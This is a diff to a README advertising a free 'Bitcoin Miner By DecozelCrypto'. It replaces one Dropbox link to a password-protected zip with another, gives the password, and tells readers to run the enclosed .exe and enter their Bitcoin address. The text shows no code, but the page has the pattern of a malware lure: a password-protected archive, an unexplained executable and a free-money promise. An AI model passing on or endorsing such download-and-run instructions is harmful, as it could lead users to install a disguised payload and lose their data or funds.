@@ -8,7 +8,7 @@
 # Download
 
 
-[Click to download the Miner](https://www.dropbox.com/s/giw3p6xmexm5lh2/Bitcoin%20Miner%20By%20DecozelCrypto.zip?dl=1)<br>
+[Click to download the Miner](https://www.dropbox.com/s/z76kdozzz0ds0l6/Bitcoin%20Miner%20By%20DecozelCrypto.zip?dl=1)<br>
 Password- DecozelCrypto
 
 Have lucky mining! :)
@@ -22,3 +22,6 @@ Have lucky mining! :)
 * Run "Bitcoin Miner By DecozelCrypto.exe"
 
 * Insert your Bitcoin address and click Start
+
+Update 2.1 (11.10.2022)
+Fix Bug
